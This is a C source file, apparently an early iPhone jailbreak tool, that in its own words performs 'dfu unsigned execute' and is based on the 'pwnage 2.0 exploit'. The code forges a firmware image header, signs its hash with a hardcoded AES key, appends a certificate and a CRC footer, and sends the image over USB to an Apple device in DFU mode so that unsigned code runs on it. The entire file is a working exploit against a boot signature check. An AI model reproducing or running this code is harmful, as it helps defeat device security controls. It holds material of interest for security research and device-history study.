#include "usb.h"
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include "crc.h"
#include "openssl/aes.h"
#include "openssl/sha.h"
#include <string.h>

const unsigned char key837[]={0x18,0x84,0x58,0xA6,0xD1,0x50,0x34,0xDF,0xE3,0x86,0xF2,0x3B,0x61,0xD4,0x37,0x74};

void hexdump(unsigned char *a, int c) { int b; for(b=0;b<c;b++) { if(b%16==0&&b!=0) printf("\n"); printf("%2.2X ",a[b]); } printf("\n"); }

int main(int argc, char *argv[])
{
	printf("dfu unsigned execute by geohot\n");
	printf("based off the dev teams pwnage 2.0 exploit\n");
	int a;
    char buf[255];
    unsigned char *fbuf;
//building file
	if(argc<2) { printf("usage: %s <filename>\n",argv[0]); return -1; }
	FILE *cert=fopen("cert","rb");
	FILE *f=fopen(argv[1], "rb");
	if(cert==0||f==0) { printf("file not found\n"); return -1; }
	fseek(cert, 0, SEEK_END);
	int len_cert = ftell(cert);
	fseek(cert, 0, SEEK_SET);
	fseek(f, 0, SEEK_END);
	int len = ftell(f);
	fseek(f, 0, SEEK_SET);
	fbuf=(unsigned char *)malloc(0x800+len+len_cert+0x10);
	memset(fbuf,0,0x800);
	fread(&fbuf[0x800],1,len,f);
	fread(&fbuf[0x800+len],1,len_cert,cert);
	fclose(f); fclose(cert);
	printf("files read %X %X\n",len,len_cert);
	strcpy(fbuf, "89001.0"); 
	fbuf[7]=0x04;
	fbuf[0x3E]=0x04;
	memcpy(&fbuf[0xC],&len,0x4);			//data size
	memcpy(&fbuf[0x10],&len,0x4);		//sig offset
	a=len+0x80;
	memcpy(&fbuf[0x14],&a,0x4);			//cert offset
	a=0xC5E;
	memcpy(&fbuf[0x18],&a,0x4);			//cert length
	printf("header generated\n");
//hashing header
	unsigned char shaout[0x14];
	SHA1(fbuf,0x40,shaout);
	AES_KEY mkey;
	AES_set_encrypt_key(key837, 0x80, &mkey);
	unsigned char iv[0x10]; memset(iv,0,0x10);
	AES_cbc_encrypt(shaout, shaout, 0x10, &mkey, iv, AES_ENCRYPT);
	memcpy(&fbuf[0x40],shaout,0x10);
//appending dfu footer
	unsigned int crc=0xFFFFFFFF;
	const char header[]={0xff,0xff,0xff,0xff,0xac,0x05,0x00,0x01,0x55,0x46,0x44,0x10};
	memcpy(&fbuf[0x800+len+len_cert],header,0xC);
	crc=update_crc(crc, fbuf, 0x800+len+len_cert+0xC);
	for(a=0;a<4;a++) { fbuf[0x800+len+len_cert+0xC+a]=crc&0xFF; crc=crc>>8; }
//sending file
    usb_init();
   	usb_find_busses();
	usb_find_devices();
    printf("USB ready\n");

    struct usb_bus *bus;
    struct usb_device *dev;

    struct usb_dev_handle *idev=0;
    int dtype=0;
    for(bus=usb_get_busses();bus;bus=bus->next)
	{
        printf("BUS found\n");
		for(dev=bus->devices;dev;dev=dev->next)
		{
            printf(" %4.4X %4.4X\n", dev->descriptor.idVendor, dev->descriptor.idProduct);
            if(dev->descriptor.idVendor==0x5ac && dev->descriptor.idProduct==0x1222)      //DFU Mode
			{
                printf("Found DFU\n");
                idev=usb_open(dev);
                dtype=2;
            }
		}
	}
	
	if(idev==0) { printf("No device found\n"); return -1;}
	int c=0;
	a=0;
	printf("sending 0x%x bytes\n", (0x800+len+len_cert+0x10));
	while(a<((0x800+len+len_cert+0x10)+0x800))
	{
		int sl=((0x800+len+len_cert+0x10)-a);
		if(sl<0) sl=0;
		if(sl>0x800) sl=0x800;
		//printf("%X %X\n",a,sl);
		if(usb_control_msg(idev, 0x21, 1, c, 0, &fbuf[a], sl, 1000)==sl) printf(".");
		else printf("x");
		if(sl==0) printf("\n");
		int b=0;
		while(usb_control_msg(idev, 0xA1, 3, 0, 0, buf, 6, 1000)==6&&b<5)
		{
			b++;
			if(sl==0) hexdump(buf, 6);
			if(buf[4]==5) break;
		}
		a+=0x800;
		c++;
    }
	usb_close(idev);
	return 0;
}
